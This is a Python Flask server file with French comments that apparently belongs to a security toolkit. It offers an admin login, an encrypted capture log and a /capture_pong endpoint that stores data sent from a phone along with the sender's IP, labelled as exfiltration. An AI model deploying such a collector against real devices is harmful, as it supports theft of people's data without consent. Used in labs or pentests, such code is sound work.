from flask import Flask, render_template, request, redirect, url_for, session
import hmac
import json
import os
import secrets
from datetime import datetime
from cryptography.fernet import Fernet
from core.crypto_vault import CryptoVault

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
# Clé de session : variable d'environnement, sinon aléatoire (sessions perdues au redémarrage)
app.secret_key = os.environ.get("WHS_SECRET_KEY") or secrets.token_hex(32)
vault = CryptoVault()  # Coffre-fort (clé chargée ou générée au premier usage)
LOG_FILE = os.path.join(BASE_DIR, "logs", "captures.json")

ADMIN_USER = os.environ.get("WHS_ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("WHS_ADMIN_PASSWORD")
if not ADMIN_PASSWORD:
    ADMIN_PASSWORD = secrets.token_urlsafe(12)
    print(f"[!] WHS_ADMIN_PASSWORD non défini. Mot de passe temporaire pour '{ADMIN_USER}' : {ADMIN_PASSWORD}")


def check_credentials(user, pw):
    """Comparaison en temps constant pour éviter les attaques temporelles."""
    if not user or not pw:
        return False
    return hmac.compare_digest(user, ADMIN_USER) and hmac.compare_digest(pw, ADMIN_PASSWORD)


def save_secure_capture(new_entry):
    f = Fernet(vault.key)
    
    # 1. Charger l'existant ou créer une liste vide
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                encrypted_content = file.read()
            # Déchiffrement pour modification
            decrypted_content = f.decrypt(encrypted_content)
            data_list = json.loads(decrypted_content)
        except Exception:
            data_list = []  # En cas d'erreur, on repart à zéro
    else:
        data_list = []

    # 2. Ajouter la nouvelle entrée avec un timestamp
    new_entry["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_list.append(new_entry)

    # 3. Chiffrer et sauvegarder le tout
    updated_json = json.dumps(data_list).encode()
    encrypted_final = f.encrypt(updated_json)
    
    with open(LOG_FILE, "wb") as file:
        file.write(encrypted_final)
    
    print("[+] Donnée sécurisée et stockée.")

@app.route('/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        if check_credentials(user, pw):
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    return '''
        <form method="post" style="text-align:center; margin-top:100px;">
            <input type="text" name="username" placeholder="Admin User"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Connexion</button>
        </form>
    '''

@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    captures = []
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        return render_template('index.html', captures=captures)

    try:
        # 1. On lit les données chiffrées
        with open(LOG_FILE, "rb") as f:
            encrypted_data = f.read()

        # 2. Déchiffrement immédiat en mémoire (on ne touche pas au fichier sur le disque)
        fernet = Fernet(vault.key)
        decrypted_data = fernet.decrypt(encrypted_data)

        # 3. Conversion en liste Python pour le template
        captures = json.loads(decrypted_data)
        captures.reverse()  # Entrées les plus récentes en premier
    except Exception as e:
        print(f"Erreur de lecture ou fichier non chiffré : {e}")
        captures = []

    return render_template('index.html', captures=captures)


@app.route('/capture_pong', methods=['POST'])
def capture_pong():
    # Récupération des données du téléphone
    data = request.get_json(silent=True) or {"info": "Données brutes"}
    data["ip_origine"] = request.remote_addr

    # Sauvegarde chiffrée
    save_secure_capture({
        "type": "PONG_EXFILTRATION",
        "contenu": data
    })

    return "", 204


def run_server():
    """Démarre le serveur Flask en mode threadé."""
    app.run(host='127.0.0.1', port=5000, debug=False)